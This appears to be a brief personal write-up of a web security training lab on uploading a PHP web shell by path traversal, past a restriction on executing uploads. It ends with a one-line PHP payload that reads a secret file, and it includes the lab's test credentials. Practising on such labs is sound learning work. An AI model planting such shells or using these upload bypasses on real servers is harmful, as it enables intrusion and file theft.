# Web shell upload via path traversal

- This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
- To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
- You can log in to your own account using the following credentials: `wiener:peter`
1. File Upload but via Path traversal

![image.png](Web%20shell%20upload%20via%20path%20traversal/image.png)

1. Web Shell but via Path traversal

![image.png](Web%20shell%20upload%20via%20path%20traversal/image%201.png)

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```